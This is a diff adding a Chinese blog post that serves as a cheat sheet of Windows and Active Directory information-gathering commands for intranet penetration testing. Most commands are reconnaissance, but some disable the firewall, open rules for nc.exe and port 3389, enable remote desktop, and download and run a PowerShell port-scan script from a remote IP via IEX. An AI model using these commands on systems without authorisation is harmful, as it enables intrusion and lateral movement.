@@ -1,0 +1,564 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>北孤清茶lthの博客 | 北孤清茶lthの博客</title><meta name="author" content="北孤清茶lth"><meta name="copyright" content="北孤清茶lth"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="信息收集命令1，执行如下命令，可以获取当前机器是否处在内网中、有几个内网、内网段分别是多少、是否是域内网、网关 IP 地址、DNS 指向的 IP 地址等信息ipconfig &#x2F;all 2，获取系统和版本信息systeminfo | findstr &#x2F;B &#x2F;I &#x2F;C:”os name” &#x2F;C: “OS Version” &#x2F;B: 在一行开始匹配，&#x2F;I：不区分大小写 &#x2F;C:string ：使用指定的字符">
+<meta property="og:type" content="article">
+<meta property="og:title" content="北孤清茶lthの博客">
+<meta property="og:url" content="http://example.com/2022/01/17/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%91%BD%E4%BB%A4/index.html">
+<meta property="og:site_name" content="北孤清茶lthの博客">
+<meta property="og:description" content="信息收集命令1，执行如下命令，可以获取当前机器是否处在内网中、有几个内网、内网段分别是多少、是否是域内网、网关 IP 地址、DNS 指向的 IP 地址等信息ipconfig &#x2F;all 2，获取系统和版本信息systeminfo | findstr &#x2F;B &#x2F;I &#x2F;C:”os name” &#x2F;C: “OS Version” &#x2F;B: 在一行开始匹配，&#x2F;I：不区分大小写 &#x2F;C:string ：使用指定的字符">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wallroom.io/img/3840x2160/bg-9d548e8.jpg">
+<meta property="article:published_time" content="2022-01-17T05:27:19.293Z">
+<meta property="article:modified_time" content="2022-02-08T14:02:00.413Z">
+<meta property="article:author" content="北孤清茶lth">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wallroom.io/img/3840x2160/bg-9d548e8.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2022/01/17/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%91%BD%E4%BB%A4/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: 北孤清茶lth","link":"链接: ","source":"来源: 北孤清茶lthの博客","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'mediumZoom',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '北孤清茶lthの博客',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-02-08 22:02:00'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/favicon.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">15</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 远方杂谈</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://wallroom.io/img/3840x2160/bg-9d548e8.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">北孤清茶lthの博客</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 远方杂谈</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">无题</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-01-17T05:27:19.293Z" title="发表于 2022-01-17 13:27:19">2022-01-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-02-08T14:02:00.413Z" title="更新于 2022-02-08 22:02:00">2022-02-08</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="信息收集命令"><a href="#信息收集命令" class="headerlink" title="信息收集命令"></a>信息收集命令</h1><h4 id="1，执行如下命令，可以获取当前机器是否处在内网中、有几个内网、内网段分别是多少、是否是域内网、网关-IP-地址、DNS-指向的-IP-地址等信息"><a href="#1，执行如下命令，可以获取当前机器是否处在内网中、有几个内网、内网段分别是多少、是否是域内网、网关-IP-地址、DNS-指向的-IP-地址等信息" class="headerlink" title="1，执行如下命令，可以获取当前机器是否处在内网中、有几个内网、内网段分别是多少、是否是域内网、网关 IP 地址、DNS 指向的 IP 地址等信息"></a>1，执行如下命令，可以获取当前机器是否处在内网中、有几个内网、内网段分别是多少、是否是域内网、网关 IP 地址、DNS 指向的 IP 地址等信息</h4><p>ipconfig /all</p>
+<h4 id="2，获取系统和版本信息"><a href="#2，获取系统和版本信息" class="headerlink" title="2，获取系统和版本信息"></a>2，获取系统和版本信息</h4><p>systeminfo | findstr /B /I /C:”os name” /C: “OS Version”</p>
+<p>/B: 在一行开始匹配，/I：不区分大小写 /C:string ：使用指定的字符串作为文字搜索字符串</p>
+<h4 id="3，如果是中文操作系统，输入如下命令"><a href="#3，如果是中文操作系统，输入如下命令" class="headerlink" title="3，如果是中文操作系统，输入如下命令"></a>3，如果是中文操作系统，输入如下命令</h4><p>systeminfo | findstr /B /I /C:”os 名称” /C: “OS 版本”</p>
+<h4 id="4，查看系统体系结构"><a href="#4，查看系统体系结构" class="headerlink" title="4，查看系统体系结构"></a>4，查看系统体系结构</h4><p>echo %processor_architecture%</p>
+<h4 id="5-查看安装的软件及版本、路径等"><a href="#5-查看安装的软件及版本、路径等" class="headerlink" title="5,查看安装的软件及版本、路径等"></a>5,查看安装的软件及版本、路径等</h4><p>wmic product get name,version</p>
+<h4 id="6-利用powershell命令，收集软件版本信息，具体如下"><a href="#6-利用powershell命令，收集软件版本信息，具体如下" class="headerlink" title="6,利用powershell命令，收集软件版本信息，具体如下"></a>6,利用powershell命令，收集软件版本信息，具体如下</h4><p>powershell “get-wmiobject -class win32_product | select-object -property name,version”</p>
+<h4 id="7，查询本机服务信息"><a href="#7，查询本机服务信息" class="headerlink" title="7，查询本机服务信息"></a>7，查询本机服务信息</h4><p>wmic service list brief</p>
+<h4 id="8-查询进程列表"><a href="#8-查询进程列表" class="headerlink" title="8,查询进程列表"></a>8,查询进程列表</h4><p>tasklist /v</p>
+<p>wmic process list brief</p>
+<h4 id="9-查看启动程序信息"><a href="#9-查看启动程序信息" class="headerlink" title="9,查看启动程序信息"></a>9,查看启动程序信息</h4><p>wmic startup get command,caption</p>
+<h4 id="10-查看计划任务"><a href="#10-查看计划任务" class="headerlink" title="10,查看计划任务"></a>10,查看计划任务</h4><p>schtasks /query /fo list /v</p>
+<h4 id="11-查看主机开机时间"><a href="#11-查看主机开机时间" class="headerlink" title="11,查看主机开机时间"></a>11,查看主机开机时间</h4><p>net statistics workstation</p>
+<h4 id="12-查询用户列表"><a href="#12-查询用户列表" class="headerlink" title="12,查询用户列表"></a>12,查询用户列表</h4><p>net user</p>
+<h4 id="13，获取本地管理员组的信息"><a href="#13，获取本地管理员组的信息" class="headerlink" title="13，获取本地管理员组的信息"></a>13，获取本地管理员组的信息</h4><p>net localgroup administrators</p>
+<h4 id="14-查看当前在线用户"><a href="#14-查看当前在线用户" class="headerlink" title="14,查看当前在线用户"></a>14,查看当前在线用户</h4><p>query user || qwinsta</p>
+<h4 id="15-列出或断开本地计算机和连接的客户端的会话"><a href="#15-列出或断开本地计算机和连接的客户端的会话" class="headerlink" title="15,列出或断开本地计算机和连接的客户端的会话"></a>15,列出或断开本地计算机和连接的客户端的会话</h4><p>net session</p>
+<h4 id="16-查询端口列表"><a href="#16-查询端口列表" class="headerlink" title="16,查询端口列表"></a>16,查询端口列表</h4><p>netstat -ano</p>
+<h4 id="17-查询补丁信息"><a href="#17-查询补丁信息" class="headerlink" title="17 ,查询补丁信息"></a>17 ,查询补丁信息</h4><p>systeminfo</p>
+<h4 id="18-使用wmic-识别安装系统中的补丁情况"><a href="#18-使用wmic-识别安装系统中的补丁情况" class="headerlink" title="18,使用wmic 识别安装系统中的补丁情况"></a>18,使用wmic 识别安装系统中的补丁情况</h4><p>wmic qfe get Caption,Description,HotFixID,InstalledOn</p>
+<h4 id="19，查询本机共享，命令如下"><a href="#19，查询本机共享，命令如下" class="headerlink" title="19，查询本机共享，命令如下"></a>19，查询本机共享，命令如下</h4><p>net share</p>
+<p># 利用wmic 查找共享，命令如下</p>
+<p>wmic share get name,path,status</p>
+<h4 id="20-查看路由表及所有可用接口的arp缓存表"><a href="#20-查看路由表及所有可用接口的arp缓存表" class="headerlink" title="20,查看路由表及所有可用接口的arp缓存表"></a>20,查看路由表及所有可用接口的arp缓存表</h4><p>route print</p>
+<p>arp -a</p>
+<h4 id="21-关闭防火墙命令"><a href="#21-关闭防火墙命令" class="headerlink" title="21,关闭防火墙命令"></a>21,关闭防火墙命令</h4><p>#windows server 2003 系统之前版本，命令如下：</p>
+<p>netsh firewall set opmode disable</p>
+<p>#windows server 2003 之后的系统版本</p>
+<p>netsh advfirewall set allprofiles state off</p>
+<h4 id="22-查看防火墙配置"><a href="#22-查看防火墙配置" class="headerlink" title="22,查看防火墙配置"></a>22,查看防火墙配置</h4><p>netsh firewall show config</p>
+<h4 id="23-修改防火墙配置"><a href="#23-修改防火墙配置" class="headerlink" title="23,修改防火墙配置"></a>23,修改防火墙配置</h4><p>#windows server 2003 系统之前版本，命令如下：</p>
+<p>netsh firewall add allowedprogram c:\nc.exe “allow nc” enable</p>
+<p>#windows server 2003 之后的系统版本，允许指定程序连入</p>
+<p>netsh advfirewall firewall add rule name=”pass nc” dir=in action=allow program=”c:\nc.exe”</p>
+<p># 允许指定程序连出 ，命令如下</p>
+<p>netsh advfirewall firewall add rule name=”allow nc”  dir=out action=allow program=”c:\nc.exe”</p>
+<p># 允许3389端口放行，命令如下</p>
+<p>netsh advfirewall firewall add rule name=”remote Desktop” protocol=tcp dir=in localport =3389 action=allow</p>
+<h4 id="24-查看计算机代理配置情况"><a href="#24-查看计算机代理配置情况" class="headerlink" title="24,查看计算机代理配置情况"></a>24,查看计算机代理配置情况</h4><div>reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
+
+</div>
+
+<h4 id="25-查询并开启远程连接服务"><a href="#25-查询并开启远程连接服务" class="headerlink" title="25,查询并开启远程连接服务"></a>25,查询并开启远程连接服务</h4><p>REG QUERY “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp” /V PortNumber</p>
+<p>#在windows 2003中开启3389</p>
+<p>wmic path win32_terminalservicesetting where (__CLASS !=””) call setallowtsconnections 1</p>
+<p>#在windows2008和widnows 2012中开启3389</p>
+<p>wmic /namespace:\root\cimv2\terminalservices path  win32_terminalservicesetting where (__CLASS !=””) call  setallowtsconnections 1</p>
+<p>wmic /namespace:\root\cimv2\terminalservices path win32_tsgeneralsetting  where (TerminalName=’RDP-Tcp’) call setuserauthenticationrequired 1</p>
+<p>reg add “HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER” /v fSingleSessionPerUser /t REG_DWORD /d 0 /f</p>
+<h1 id="2-知识总结"><a href="#2-知识总结" class="headerlink" title="2.知识总结"></a>2.知识总结</h1><p><img src="../Blog/source/images/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%91%BD%E4%BB%A4/image-20220126011444388.png" alt="image-20220126011444388"></p>
+<h1 id="网上命令"><a href="#网上命令" class="headerlink" title="网上命令"></a>网上命令</h1><h2 id="本机信息收集"><a href="#本机信息收集" class="headerlink" title="本机信息收集"></a>本机信息收集</h2><p>查看当前用户、权限</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami</span><br><span class="line">whoami /all      // 查看当前域并获取域SID</span><br></pre></td></tr></table></figure>
+
+
+<p>​        查看网络配置情况</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ipconfig /all              // 查询本机IP段，所在域等</span><br><span class="line">route print                // 打印路由信息</span><br><span class="line">arp -a                     // 查看arp缓存，可以发现内网主机</span><br></pre></td></tr></table></figure>
+
+<p>查看操作系统信息</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure>
+
+<p>执行以下命令直接查看操作系统及版本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</span><br><span class="line"></span><br><span class="line">systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;          // 中文操作系统</span><br></pre></td></tr></table></figure>
+
+<p>查看系统体系结构</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo %PROCESSOR_ARCHITECTURE%</span><br></pre></td></tr></table></figure>
+
+<p>查看安转的软件及版本信息</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic product get name,version</span><br></pre></td></tr></table></figure>
+
+<p>查看本地用户列表</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user                                // 查看本地用户</span><br><span class="line">net localgroup administrators           // 查看本地管理员组（通常包含域用户）</span><br><span class="line">net user xxx   // 查看指定用户详细信息</span><br></pre></td></tr></table></figure>
+
+<p>列出本地计算机与所连接的客户端主机之间的会话</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net session</span><br></pre></td></tr></table></figure>
+
+<p>查看补丁列表</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systeminfo</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure>
+
+<p>注意：域内主机的补丁通常是批量安装的，通过查看本机补丁列表，就可以批量找到内网未打补丁的漏洞。<br>查看本机共享</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net share</span><br><span class="line">wmic share get name,path,status</span><br></pre></td></tr></table></figure>
+
+<p>查看本机进程</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tasklist</span><br><span class="line">wmic process</span><br><span class="line">wmic process list brief</span><br><span class="line">wmic process get processid,executablepath,name      // 显示进程的路径、名称、pid</span><br></pre></td></tr></table></figure>
+
+<p>查看本机服务</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic service list brief</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>查看自启程序列表</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic startuo get command,caption</span><br></pre></td></tr></table></figure>
+
+<p>查看端口信息</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure>
+
+<p>可以看到当前主机端口开放与使用情况、与哪些主机建立了连接。<br>查看主机开机时间</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net statistics workstation</span><br></pre></td></tr></table></figure>
+
+<p>查看计划任务</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">schtasks /query /fo LIST /v             // query显示所有计划任务</span><br></pre></td></tr></table></figure>
+
+<p>防火墙相关操作</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh firewall show state                      // 防火墙状态</span><br><span class="line">netsh firewall show config                     // 查看防火墙配置</span><br><span class="line">netsh firewall set opmode disable              // 关闭防火墙（windows server 2003及以前）</span><br><span class="line">netsh advfirewall set allprofiles state off    // 关闭防火墙（windows server 2003以后）</span><br><span class="line"></span><br><span class="line">修改防火墙配置</span><br><span class="line"></span><br><span class="line">netsh firewall add allowedprogram c:\\xxx\\xx.exe &quot;allow xx&quot; enable    // 允许指定程序的全部连接（windows server 2003及以前）</span><br><span class="line"></span><br><span class="line">windows server 2003之后：</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;pass xx&quot; dir=in action=allow  program=&quot;C:\xxx\xx.exe&quot;         // 允许某个程序连入</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;pass xx&quot; dir=out action=allow program=&quot;C:\xxx\xx.exe&quot;               // 允许某个程序外连</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow        // 开启3389端口，允许改端口放行</span><br></pre></td></tr></table></figure>
+
+<p>开启远程桌面连接</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br><span class="line"></span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure>
+
+<h2 id="自动化的信息收集脚本"><a href="#自动化的信息收集脚本" class="headerlink" title="自动化的信息收集脚本"></a>自动化的信息收集脚本</h2><p>下载地址：<a target="_blank" rel="noopener" href="http://www.fuzzysecurity.com/scripts/files/wmic_info.rar">http://www.fuzzysecurity.com/scripts/files/wmic_info.rar</a></p>
+<p>该脚本可以在目标机器上面完成服务。用户列表，用户组、网络接口、硬件信息、网络共享信息、操作系统、安装的补丁、安装的软件、自启程序、时区等信息的查询工作。其利用WMIC来收集信息。执行脚本后,会将所有结果写入一个HTML文件</p>
+<h2 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h2><p>判断是否存在域</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net config workstation     // 查看当前计算机名，全名，用户名，系统版本，工作站域，登陆的域等</span><br><span class="line">net view /domain              // 查看域</span><br></pre></td></tr></table></figure>
+
+<p>“工作站DNS名称”为域名（若为WORKGROUP，则表示当前不是域环境），登录域为当前登陆的域。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure>
+
+<p>如果为WORKGROUP则表示当前不是域环境，机器不在于内。<br>查看主域控制器</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net time /domain           // 主域服务器会同时作为时间服务器</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net group &quot;domain controllers&quot; /domain          // 查看域控制器组</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nltest /DCLIST:god          // 查看域控制器主机名，god为域名</span><br></pre></td></tr></table></figure>
+
+<p>定位域控制器</p>
+<p>我们已经知道了与控制器的名称，接下来就要定位域控制器的ip地址了。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping owa.god.org          // owa为域控制器名</span><br></pre></td></tr></table></figure>
+
+<p>如上图得到域控的ip为192.168.52.138。<br>列出域信任关系</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nltest /domain_trusts      列出域与域之间的信任关系</span><br></pre></td></tr></table></figure>
+
+<p>查看域内用户组列表</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net group /domain</span><br></pre></td></tr></table></figure>
+
+
+
+<pre><code>Domain Admins 域管理员组
+
+Domain Computers 域内的机器
+
+Domain Controllers 域控制器
+
+Domain Users 域用户
+
+Enterprise Admins 企业系统管理员组
+</code></pre>
+<p>查看所有的域成员主机（机器用户；不包括域控）：</p>
+<p>查看域管理员组：</p>
+<p>如上图可以得到域管理员用户有administrator和owa$。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net group &quot;Enterprise Admin&quot; /domain</span><br></pre></td></tr></table></figure>
+
+<p>获取域密码信息</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net accounts /domain</span><br></pre></td></tr></table></figure>
+
+<p>查看域用户信息</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user /domain        // 查看域用户</span><br><span class="line">net user xxx /domain   // 查看指定域用户详细信息</span><br></pre></td></tr></table></figure>
+
+<p>获取域内用户详细信息</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic useraccount get /all</span><br></pre></td></tr></table></figure>
+
+<p>如上图，可以获取到域用户的用户名、描述信息、SID、域名、状态等。<br>域内端口扫描</p>
+<p>我们在内网渗透中，通过查看域内目标主机的端口开放情况，来了解目标主机上的服务，通过其服务版本还可以找到其开放服务的漏洞。我们可以使用metasploit内置的端口扫描模块，也可以上传端口扫描工具进行扫描。在扫描时注意以下几点：</p>
+<pre><code>端口的banner信息
+端口上运行的服务
+</code></pre>
+<h3 id="利用telnet工具进行端口扫描"><a href="#利用telnet工具进行端口扫描" class="headerlink" title="利用telnet工具进行端口扫描"></a>利用telnet工具进行端口扫描</h3><p>Telnet是进行远程登录的标准协议和主要方式，它为用户提供了在本地计算机上完成远程主机工作的能力。可以用telnet命令来测试端口号是否正常打开还是关闭状态。使用时需要目标主机在“添加删除程序”里面的“打开或关闭windows功能”里面开启telnet功能，然后你再去CMD的命令行里面输入telnet就没有问题了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">telnet &lt;主机&gt; &lt;端口&gt;</span><br><span class="line">telnet 192.168.52.138 445</span><br></pre></td></tr></table></figure>
+
+<p>出现连接失败，代表对方端口没有打开。</p>
+<h2 id="PowerSploit-中的Invoke-portscan-ps1脚本"><a href="#PowerSploit-中的Invoke-portscan-ps1脚本" class="headerlink" title="PowerSploit 中的Invoke-portscan.ps1脚本"></a>PowerSploit 中的Invoke-portscan.ps1脚本</h2><p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell -nop -exec bypass -c &quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://39.xxx.xxx.210/powersploit/Recon/Invoke-Portscan.ps1&#x27;);Invoke-Portscan -Hosts 192.168.1.1/24 -T 4 -ports &#x27;445,1433,8080,80,3389&#x27;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>// 或者扫描全部的端口：-Ports “1-65535”</p>
+<h2 id="Nishang-中的Invoke-portscan-ps1脚本"><a href="#Nishang-中的Invoke-portscan-ps1脚本" class="headerlink" title="Nishang 中的Invoke-portscan.ps1脚本"></a>Nishang 中的Invoke-portscan.ps1脚本</h2><p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a></p>
+<p>该脚本可用于发现主机、解析主机名、扫描端口。</p>
